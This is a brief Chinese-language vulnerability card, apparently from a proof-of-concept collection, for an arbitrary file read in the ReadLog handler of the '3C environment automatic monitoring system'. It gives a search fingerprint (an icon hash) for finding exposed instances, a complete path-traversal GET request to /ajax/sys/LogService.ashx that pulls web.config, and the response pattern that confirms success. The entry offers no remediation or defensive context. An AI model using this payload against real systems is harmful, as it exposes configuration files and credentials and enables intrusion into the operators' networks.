# 3C环境自动监测监控系统ReadLog文件读取漏洞

3C环境自动监测监控系统ReadLog ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="-338936081"`
- **请求**：`GET /ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config HTTP/1.1`
- **响应特征**：200 ?xml